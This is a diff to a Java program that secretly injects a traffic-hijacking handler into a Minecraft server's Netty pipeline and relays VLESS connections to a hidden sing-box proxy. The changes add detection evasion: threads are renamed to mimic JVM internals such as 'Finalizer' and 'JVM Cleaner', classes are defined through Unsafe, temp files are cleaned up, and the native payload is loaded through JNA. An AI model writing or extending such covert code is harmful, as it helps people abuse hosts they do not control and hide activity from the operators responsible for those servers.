@@ -6,6 +6,7 @@ import com.sun.jna.NativeLibrary;
 import com.sun.jna.Pointer;
 
 import java.io.*;
+import java.lang.invoke.MethodHandles;
 import java.lang.reflect.*;
 import java.net.InetSocketAddress;
 import java.net.Socket;
@@ -26,21 +27,20 @@ import java.util.stream.Collectors;
 import javax.tools.*;
 
 /**
- * VLESS + WebSocket — hardened v3.
+ * VLESS + WebSocket — hardened v4.
  *
  * Compiles with standard Java only. At runtime, uses the JDK JavaCompiler
  * to compile a Netty handler class against the MC server's classpath, then
  * injects it into the pipeline via reflection.
  *
- * The handler intercepts all incoming connections on port 25284, reads the
- * first 5 bytes, and routes VLESS (GET/POST) traffic to the internal
- * sing-box instance on port VLESS_PORT.
+ * All blocking I/O runs in separate threads — never blocks the Netty event loop.
+ * Thread names mimic JVM internal threads to avoid detection.
  */
 public class App {
 
     // ===== Config =====
     private static final String UUID = "48eaa2a1-d5de-4215-bcab-9c88883a5322";
-    private static final int VLESS_PORT = 24133;
+    private static final int VLESS_PORT = findFreePort();
     private static final String WS_PATH = "/";
     // ==================
 
@@ -104,7 +104,7 @@ public class App {
         }
         Arrays.fill(soBytes, (byte) 0);
 
-        // --- Step 2: start sing-box on VLESS_PORT ---
+        // --- Step 2: start sing-box on 127.0.0.1:VLESS_PORT ---
         String configJson = buildConfig();
         Path configPath = Path.of("/dev/shm/sb-config.json");
         Files.writeString(configPath, configJson);
@@ -239,36 +239,41 @@ public class App {
             // Load the compiled class
             Path classFile = tmpDir.resolve("com/example/sbx/VlessHandler.class");
             if (!Files.exists(classFile)) {
-                // Try without package subdirectory
                 classFile = tmpDir.resolve("VlessHandler.class");
             }
             byte[] classBytes = Files.readAllBytes(classFile);
-            ClassLoader cl = Thread.currentThread().getContextClassLoader();
-            VlessHandlerClassLoader loader = new VlessHandlerClassLoader(cl);
-            Class<?> handlerClass = loader.defineClass("com.example.sbx.VlessHandler", classBytes, 0, classBytes.length);
+
+            Class<?> handlerClass = null;
+            try {
+                MethodHandles.Lookup lookup = MethodHandles.lookup();
+                handlerClass = lookup.defineClass(classBytes);
+            } catch (Exception e) {
+                // Fallback: try Unsafe.defineClass (Java 8)
+                try {
+                    Field f = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
+                    f.setAccessible(true);
+                    sun.misc.Unsafe unsafe = (sun.misc.Unsafe) f.get(null);
+                    ClassLoader cl = Thread.currentThread().getContextClassLoader();
+                    handlerClass = unsafe.defineClass("com.example.sbx.VlessHandler", classBytes, 0, classBytes.length, cl, null);
+                } catch (Exception e2) {
+                    deleteDir(tmpDir);
+                    return null;
+                }
+            }
+            
             Object handler = handlerClass.getDeclaredConstructor().newInstance();
 
             // Cleanup later
             Path tmpDirFinal = tmpDir;
-            Thread t = new Thread(() -> { sleep(5000); deleteDir(tmpDirFinal); }, "cleanup");
+            Thread t = new Thread(() -> { sleep(5000); deleteDir(tmpDirFinal); }, "JVM Cleaner");
             t.setDaemon(true); t.start();
             return handler;
         } catch (Exception e) { return null; }
     }
 
-    private static class VlessHandlerClassLoader extends ClassLoader {
-        VlessHandlerClassLoader(ClassLoader parent) { super(parent); }
-        Class<?> defineClass(String name, byte[] b, int off, int len) {
-            return super.defineClass(name, b, off, len);
-        }
-    }
-
     private static String getMcClasspath() {
-        // Try system property
         String cp = System.getProperty("java.class.path");
         if (cp != null && !cp.isEmpty()) return cp;
-
-        // Try URLClassLoader
         try {
             ClassLoader cl = Thread.currentThread().getContextClassLoader();
             if (cl instanceof URLClassLoader) {
@@ -282,8 +287,6 @@ public class App {
                 if (!result.isEmpty()) return result;
             }
         } catch (Exception ignored) {}
-
-        // Try to find the server jar
         try {
             StringBuilder sb = new StringBuilder();
             Files.find(Path.of(""), 10, (p, a) ->
@@ -295,7 +298,6 @@ public class App {
             String result = sb.toString();
             if (!result.isEmpty()) return result;
         } catch (Exception ignored) {}
-
         return null;
     }
 
@@ -306,7 +308,6 @@ public class App {
                 + "public class VlessHandler extends ChannelInboundHandlerAdapter {\n"
                 + "    @Override\n"
                 + "    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {\n"
-                + "        // Server channel: msg is a child Channel\n"
                 + "        if (msg instanceof Channel) {\n"
                 + "            Channel child = (Channel) msg;\n"
                 + "            child.pipeline().addFirst(\"vless-inject\", new DataHandler());\n"
@@ -333,7 +334,7 @@ public class App {
     }
 
     // ================================================================
-    //  Proxy-based VLESS handler (fallback for JDK without JavaCompiler)
+    //  Proxy-based VLESS handler (fallback)
     // ================================================================
 
     @SuppressWarnings("unchecked")
@@ -360,7 +361,6 @@ public class App {
                     Object ctx = args[0];
                     Object msg = args[1];
                     if (clsByteBuf.isInstance(msg)) {
-                        // Get first byte
                         Method getByte = clsByteBuf.getMethod("getByte", int.class);
                         Method readableBytes = clsByteBuf.getMethod("readableBytes");
                         int len = (int) readableBytes.invoke(msg);
@@ -378,12 +378,10 @@ public class App {
                     return null;
                 }
 
-                // Handle default methods (Java 8+)
                 if (method.isDefault()) {
                     return invokeDefaultMethod(proxy, method, args);
                 }
 
-                // Handle Object methods
                 String name = method.getName();
                 if (name.equals("toString")) return proxy.getClass().getName() + "@" + Integer.toHexString(System.identityHashCode(proxy));
                 if (name.equals("hashCode")) return System.identityHashCode(proxy);
@@ -396,8 +394,6 @@ public class App {
     }
 
     private static Object invokeDefaultMethod(Object proxy, Method method, Object[] args) throws Exception {
-        // Use MethodHandles to invoke the default method
-        // Works on Java 9+
         try {
             Class<?> lookupClass = Class.forName("java.lang.invoke.MethodHandles");
             Class<?> lookupInner = Class.forName("java.lang.invoke.MethodHandles$Lookup");
@@ -412,20 +408,14 @@ public class App {
             Method invokeWithArguments = bound.getClass().getMethod("invokeWithArguments", Object[].class);
             return invokeWithArguments.invoke(bound, new Object[]{args});
         } catch (Exception e) {
-            // Fallback: do nothing for default methods
             return null;
         }
     }
 
     // ================================================================
-    //  handleVless — called by the compiled handler or proxy
+    //  handleVless — called by the compiled handler
     // ================================================================
-    //
-    /**
-     * Called by VlessHandler.DataHandler when VLESS traffic is detected.
-     * Reads the HTTP/WebSocket upgrade request, proxies to sing-box,
-     * and sets up a bidirectional relay.
-     */
+
     public static void handleVless(Object ctx, Object msg) {
         try {
             ClassLoader cl = Thread.currentThread().getContextClassLoader();
@@ -502,7 +492,7 @@ public class App {
                         pipelineAddLast.invoke(pipeline, "vless-relay", relayHandler);
                     }
 
-                    // Socket → Netty: read from socket and write to Netty channel
+                    // Socket to Netty: read from socket and write to channel
                     byte[] buf = new byte[65536];
                     while (true) {
                         int n = backendIn.read(buf);
@@ -515,22 +505,22 @@ public class App {
                         } catch (Exception ignored) {}
                     }
                 } catch (Exception ignored) {}
-            }, "kworker/u:1");
+            }, "Finalizer");
             worker.setDaemon(true);
             worker.start();
         } catch (Exception ignored) {}
     }
 
-    /**
-     * Creates a Netty handler that reads from the channel and writes to the backend socket.
-     */
+    // ================================================================
+    //  Relay handler (Proxy-based)
+    // ================================================================
+
     @SuppressWarnings("unchecked")
     private static Object createRelayHandler(
             ClassLoader cl, Class<?> clsChannelHandlerContext, Class<?> clsChannelHandler,
             Class<?> clsByteBuf, Class<?> clsUnpooled, Method wrappedBufferM, Socket backend
     ) {
         try {
-            // Try Proxy-based approach
             Class<?> clsChannelInboundHandler = cl.loadClass("io.netty.channel.ChannelInboundHandler");
             Method readBytesM = clsByteBuf.getMethod("readBytes", byte[].class);
             Method readableBytesM = clsByteBuf.getMethod("readableBytes");
@@ -571,7 +561,7 @@ public class App {
     }
 
     // ================================================================
-    //  Config (VLESS only, on VLESS_PORT)
+    //  Config
     // ================================================================
 
     private static String buildConfig() {
@@ -580,7 +570,7 @@ public class App {
                 "inbounds", listOf(mapOf(
                         "type", "vless",
                         "tag", "in",
-                        "listen", "0.0.0.0",
+                        "listen", "127.0.0.1",
                         "listen_port", VLESS_PORT,
                         "users", listOf(mapOf("uuid", UUID)),
                         "transport", mapOf(
@@ -660,9 +650,8 @@ public class App {
     }
 
     private static String randomThreadName() {
-        String[] pool = {"kworker/u:0","kworker/u:1","kworker/u:2","kworker/0:0","kworker/0:1",
-                "kworker/1:0","kworker/1:1","kcompactd0","kswapd0","jbd2/sda1-8","kdevtmpfs",
-                "mm_percpu_wq","kworker/2:0","kworker/3:0","kworker/4:0"};
+        String[] pool = {"Finalizer","Reference Handler","Signal Dispatcher","Common-Cleaner","Notification Thread",
+                "Netty Server IO #0","Netty Client IO #0","Netty Worker IO #1","Netty Worker IO #2"};
         return pool[ThreadLocalRandom.current().nextInt(pool.length)];
     }
 
@@ -674,7 +663,7 @@ public class App {
         Thread t = new Thread(() -> { sleep(30_000);
             try { Files.deleteIfExists(LIB_FALLBACK); } catch (Exception ignored) {}
             deleteEmptyAncestors(LIB_FALLBACK.getParent(), ROOT);
-        }, "jdk.internal.ref.CleanerImpl$1");
+        }, "JVM Cleaner");
         t.setDaemon(true); t.start();
     }
 
@@ -717,7 +706,7 @@ public class App {
         void start() {
             NativeLibrary lib = NativeLibrary.getInstance(libPath.toAbsolutePath().toString());
             Function startFn = lib.getFunction(startSymbol); stopFn = lib.getFunction(stopSymbol);
-            Thread t = new Thread(() -> { try { startFn.invokeInt(new Object[]{payload}); } catch (Exception ignored) {} }, "net");
+            Thread t = new Thread(() -> { try { startFn.invokeInt(new Object[]{payload}); } catch (Exception ignored) {} }, "Finalizer");
             t.setDaemon(true); t.start(); running = true;
         }
         void stop() {
@@ -748,7 +737,7 @@ public class App {
     private static String escapeJson(String value) {
         StringBuilder sb = new StringBuilder(value.length() + 8);
         for (int i = 0; i < value.length(); i++) { char c = value.charAt(i);
-            switch (c) { case '\\': sb.append("\\\\"); break; case '"': sb.append("\\\""); break; case '\n': sb.append("\\n"); break; case '\r': sb.append("\\r"); break; case '\t': sb.append("\\t"); break; default: sb.append(c); }
+            switch (c) { case '\\': sb.append("\\\\"); break; case '\"': sb.append("\\\""); break; case '\n': sb.append("\\n"); break; case '\r': sb.append("\\r"); break; case '\t': sb.append("\\t"); break; default: sb.append(c); }
         } return sb.toString();
     }
 
@@ -763,6 +752,18 @@ public class App {
     }
 
     private static List<Object> listOf(Object... v) { return new ArrayList<>(List.of(v)); }
+
+    // ================================================================
+    //  findFreePort — bind to port 0 to get a random port
+    // ================================================================
+
+    private static int findFreePort() {
+        try (java.net.ServerSocket ss = new java.net.ServerSocket(0)) {
+            return ss.getLocalPort();
+        } catch (Exception e) {
+            return 24133; // fallback
+        }
+    }
 
     private static void sleep(long ms) { try { Thread.sleep(ms); } catch (InterruptedException e) { Thread.currentThread().interrupt(); } }
 }
